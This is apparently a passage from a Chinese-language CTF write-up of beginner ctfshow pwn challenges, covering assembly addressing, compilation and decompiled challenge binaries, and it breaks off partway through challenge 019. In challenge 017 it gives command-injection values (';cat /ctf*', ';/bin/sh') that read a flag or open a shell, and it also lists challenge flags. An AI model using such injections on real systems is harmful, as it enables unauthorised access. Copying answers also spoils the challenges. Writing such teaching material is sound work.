<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2 ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add edx, 2</span><br><span class="line">	mov eax, [ecx + edx * 2]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure>
<ul>
<li>计算最终也是 [0x80490E8 + 2*2 ] = [0X80490EC]</li>
<li><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></li>
</ul>
<h4 id="012-相对基址变址寻址"><a class="header-anchor" href="#012-相对基址变址寻址">¶</a>012  相对基址变址寻址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1 ; 将1赋值给edx</span><br><span class="line">    add ecx, 8 ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">    </span><br><span class="line">对应IDA：</span><br><span class="line">	mov ecx, offset dword_80490E8</span><br><span class="line">	add edx, 2</span><br><span class="line">	mov eax, [ecx + edx * 2]</span><br><span class="line">	</span><br><span class="line">.data:080490E8 dword_80490E8 dd 696C6557h		; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;, 0</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>hex(8 + 0x80490E8 + 1*2 -6)</code>    得到<code>0x80490ec</code>   也就是<code>“ome_to_CTFshow_PWN”</code></p>
</li>
<li>
<p><code>ctfshow&#123;ome_to_CTFshow_PWN&#125;</code></p>
</li>
</ul>
<h3 id="013-gcc编译"><a class="header-anchor" href="#013-gcc编译">¶</a>013  gcc编译</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat flag.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[] = &#123;<span class="number">99</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">104</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">95</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">71</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">125</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来</p>
</li>
<li>
<p>在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串</p>
</li>
<li>
<p>运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符），printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。</p>
</li>
<li>
<p>根据给定的整数值数组，还原出的字符串为： <code>ctfshow&#123;hOw_t0_us3_GCC?&#125;</code></p>
</li>
</ul>
<h3 id="014-gcc编译-c文件"><a class="header-anchor" href="#014-gcc编译-c文件">¶</a>014  gcc编译.c文件</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flag.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024  </span></span><br><span class="line"><span class="comment">// 定义了缓冲区的大小为1024字节，用于读取文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    </span><br><span class="line">    fp = fopen(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;rb&quot;</span>);  <span class="comment">// 尝试以二进制只读模式(&quot;rb&quot;)打开名为&quot;key&quot;的文件</span></span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Nothing here!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> output[BUFFER_SIZE * <span class="number">9</span> + <span class="number">12</span>];  <span class="comment">// 输出字符串output的大小预留得比原始缓冲区大得多，以容纳转换后的位表示及额外的格式化字符</span></span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = fread(buffer, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), BUFFER_SIZE, fp)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 从打开的文件中读取数据，并将读取到的每个字节的位转换成字符串形式输出</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  <span class="comment">// 外层的for循环(for (size_t i = 0; i &lt; n; i++))遍历了当前读取批次中的每个字节</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; j--) &#123;  <span class="comment">// 内层的for循环(for (int j = 7; j &gt;= 0; j--))负责将每个字节的每一位转换为字符串</span></span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;%d&quot;</span>, (buffer[i] &gt;&gt; j) &amp; <span class="number">1</span>);  <span class="comment">// (buffer[i] &gt;&gt; j)是对字节buffer[i]进行右移操作</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i != n - <span class="number">1</span>) &#123;  <span class="comment">// 非最后一个字节就加下划线</span></span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) &#123;  <span class="comment">// 非文件最后一部分就加空格</span></span><br><span class="line">            offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>程序打开名为 “key” 的文件，以二进制（“rb”）模式进行读取。如果文件打开失败，将输出错误消息 “Nothing here!” 并返回 -1</p>
</li>
<li>
<p>然后，程序定义了一个缓冲区 buffer 用于读取文件内容，以及一个字符串数组 output 用于存储转换后的二进制字符串。变量 offset 用于跟踪 output 数组中的偏移量。</p>
</li>
<li>
<p>接下来，程序开始将输出字符串初始化为 “ctfshow{”，然后进入一个循环，每次读取BUFFER_SIZE 字节的数据到 buffer 中，并将其转换为二进制字符串形式。</p>
</li>
<li>
<p>在内层循环中，程序遍历当前读取的字节的每一位，从最高位到最低位。通过右移操作和位与运算，提取出每一位的值，并使用 sprintf 函数将其添加到 output 字符串中。</p>
</li>
<li>
<p>在每个字节的二进制表示结束后，如果当前字节不是最后一个字节，则在 output 字符串中添加下划线作为分隔符。</p>
</li>
<li>
<p>如果文件还未读取完毕（即文件结束符未被读取），则在 output 字符串中添加空格作为分隔符。</p>
</li>
<li>
<p>循环结束后，程序在 output 字符串中添加 “}”，表示结束标记，并使用 printf 函数将最终的转换结果打印出来。最后，程序关闭文件，并返回 0 表示成功执行。</p>
</li>
<li>
<p>该程序的作用是将二进制文件中的内容转换为二进制字符串形式，并以特定格式输出</p>
</li>
<li>
<p><code>echo &quot;CTFshow&quot;&gt;key</code>   使用<code>echo</code>工具输出到标准输出，通过重定向操作符<code>&gt;</code>，输出的内容被写入（或覆盖）到名为<code>key</code>的文件中。  创建一个含有字符串<code>CTFshow</code>的文件<code>key</code></p>
</li>
<li>
<p><code>gcc -o flag flag.c</code>   编译<code>flag.c</code>，生成一个名为<code>flag</code>的程序</p>
</li>
</ul>
<h3 id="015-编译汇编代码"><a class="header-anchor" href="#015-编译汇编代码">¶</a>015  编译汇编代码</h3>
<h4 id="汇编语言→目标文件→可执行文件"><a class="header-anchor" href="#汇编语言→目标文件→可执行文件">¶</a>汇编语言→目标文件→可执行文件</h4>
<p><code>nsam -f elf flag.asm -o flag.o</code>   将汇编代码编译为目标文件</p>
<p><code>ld -m elf_i386 -o flag flag.o</code>    将目标文件链接为可执行文件</p>
<p><code>./flag</code>   运行文件</p>
<h3 id="016-gcc编译-s文件"><a class="header-anchor" href="#016-gcc编译-s文件">¶</a>016  gcc编译.s文件</h3>
<ul>
<li>.s 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。</li>
<li>汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 .s 文件通常由汇编器（Assembler）处理，将其转换为可执行文件或目标文件。</li>
<li>可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</li>
<li><code>gcc -o flag flag.s</code>   将.s文件编译为可执行文件</li>
</ul>
<h3 id="017-Linux基础命令的拼接"><a class="header-anchor" href="#017-Linux基础命令的拼接">¶</a>017  Linux基础命令的拼接</h3>
<ul>
<li>在Linux命令中，分号（ ; ）用于分隔多个命令，允许在一行上顺序执行多个命令。</li>
<li>当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。</li>
<li><code>command1 ; command2 ; command3</code>
<ul>
<li>在这个例子中， command1 执行完毕后，无论成功与否，接着会执行 command2 ，然后再执command3 这样，多个命令可以按顺序在一行上执行。</li>
</ul>
</li>
<li><code>command1 &amp; command2 </code></li>
<li>也可以使用 &amp; 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命令之间使用 &amp; 进行分隔</li>
<li>command1 和 command2 是两个要执行的命令。通过使用 &amp; 将它们连接起来，它们将同时在后台执行。这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn017/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+Ah] [rbp-16h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="comment">/* 设置缓冲区行为。前一个可能用于清除.bss段的缓冲，后一个设置标准输入流为无缓冲模式 */</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);  </span><br><span class="line">  <span class="built_in">puts</span>(asc_D48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DC0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E40);</span><br><span class="line">  <span class="built_in">puts</span>(asc_ED0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_F60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_FE8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_1080);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : You should understand the basic command usage of Linux! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  *(_DWORD *)dest = <span class="number">790655852</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nHow much do you know about Linux commands? \n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nEnter the command you want choose:(1.2.3.4 or 5)\n&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        system(<span class="string">&quot;id&quot;</span>); <span class="comment">/* 使用system调用执行id命令，显示当前用户的ID和组ID */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Which directory?(&#x27;/&#x27;,&#x27;./&#x27; or the directiry you want?)&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Execution succeeded!&quot;</span>);</span><br><span class="line">        <span class="comment">/* 读取用户输入的目录名，并将其附加到dest，然后使用system执行ls命令列出该目录的内容 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;$cat /ctfshow_flag&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;... ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your flag is ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;flag is not here!&#125;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x14</span>u);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wtf?You haven&#x27;t left yet?\nOk~ give you flag:\nflag is loading......&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x1BF52</span>u);</span><br><span class="line">        system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);  </span><br><span class="line">        <span class="comment">/* 假装读取一个隐藏的标志文件，实际上在长时间延迟后才真正尝试读取文件，超过远程环境的时长，本地可以等等看hhhh */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;su: Authentication failure&quot;</span>);</span><br><span class="line">        <span class="comment">/* 模拟失败的身份验证尝试 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;See you!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;command not found!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这个程序存在明显的安全漏洞，比如在案例2中，strcat没有检查buf的长度，可能导致缓冲区溢出。此外，直接使用system函数执行用户提供的输入也存在命令注入的风险 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.id&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.ls&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.cat /ctfshow_flag&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.su&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>选项3最后会执行system(“cat /ctfshow_flag”);命令，虽然最终能达到我们想要的效果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这条直接pass.</li>
<li>其他1/4/5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限制了10字节，但是我们完全够用，可以构造出<code>;cat /ctf*</code> <code>;/bin/sh</code>等直接拿取一个shell或者直接读出flag</li>
<li>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。所以<code>cat /ctf*</code>能够读到flag</li>
</ul>
<h3 id="018-看源码喵"><a class="header-anchor" href="#018-看源码喵">¶</a>018  看源码喵</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn018/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B10);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CB0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D38);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DD0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Do you know redirect output ?                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which is the real flag?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">9</span> )</span><br><span class="line">    fake();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    real();</span><br><span class="line">  system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fake</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">real</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>读取用户输入，是9执行fake()，不是9执行real()</li>
<li>看源码，两个函数的区别在于中间是<code>&gt;&gt;</code> 还是 <code>&gt;</code></li>
<li><code>system(&quot;echo 'flag is here'&gt;&gt;/ctfshow_flag&quot;);</code></li>
<li>这个命令将字符串 ‘flag is here’ <strong><u><em>追加写入</em></u></strong> /ctfshow_flag 文件中。 &gt;&gt; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 ‘flag is here’ 。</li>
<li><code>system(&quot;echo 'flag is here'&gt;/ctfshow_flag&quot;);</code></li>
<li>这个命令将字符串 ‘flag is here’ <strong><u><em>覆盖写入</em></u></strong> /ctfshow_flag 文件中。 &gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 ‘flag is here’ 。</li>
<li>在远程环境中需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容乌拉！</li>
</ul>
<h3 id="019-父子进程（还是有一点点懵"><a class="header-anchor" href="#019-父子进程（还是有一点点懵">¶</a>019  父子进程（还是有一点点懵</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn019/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_BF0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C70);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E18);</span><br><span class="line">  <span class="built_in">puts</span>(asc_EB0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Turn off output, how to get flag? &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( fork() )  <span class="comment">// 父进程</span></span><br><span class="line">  <span class="comment">/* fork系统调用创建了一个子进程，使得当前进程的副本运行。父进程和子进程共享相同的代码，但有独立的进程上下文。如果fork成功，它返回子进程的PID给父进程，而在子进程中返回0 */</span></span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0LL</span>);  <span class="comment">/* 父进程在这里等待任何子进程的终止。wait系统调用会阻塞直到一个子进程结束 */</span></span><br><span class="line">    sleep(<span class="number">3u</span>);  <span class="comment">/* 让父进程休眠三秒，给子进程足够的时间执行 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is not here!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>  <span class="comment">// 子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;give you a shell! now you need to get flag!&quot;</span>);</span><br><span class="line">    fclose(_bss_start);  <span class="comment">// 关闭文件输出流</span></span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);  <span class="comment">// 从标准输入中读取用户输入的命令，并存储在 buf 中</span></span><br><span class="line">    system(buf);  <span class="comment">// 执行用户输入的命令</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 程序设计了一个简单的父子进程交互，其中子进程提供了用户一个shell，让用户尝试找到旗帜 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>if (fork()) : 这里使用 fork() 函数创建一个子进程。父进程中， fork() 返回子进程的进程ID，所以进入 if 语句块；子进程中， fork() 返回0，所以进入 else 语句块。</p>
</li>
<li>
<p>在父进程中：<code>wait(0LL)</code> : 父进程通过 wait() 函数等待子进程的结束，以确保子进程执行完毕。</p>
</li>
<li>
<p><code>sleep(3u)</code>    父进程睡眠3秒钟。</p>
</li>
<li>
<p><code>printf(&quot;flag is not here!&quot;)</code>   输出提示信息，表明flag不在此处</p>
</li>
<li>
<p>在子进程中：puts(“give you a shell! now you need to get flag!”) : 输出提示信息，表示给予用户一个shell，让其获取flag。</p>
<ul>
<li><code>fclose()</code>    关闭文件输出流。</li>
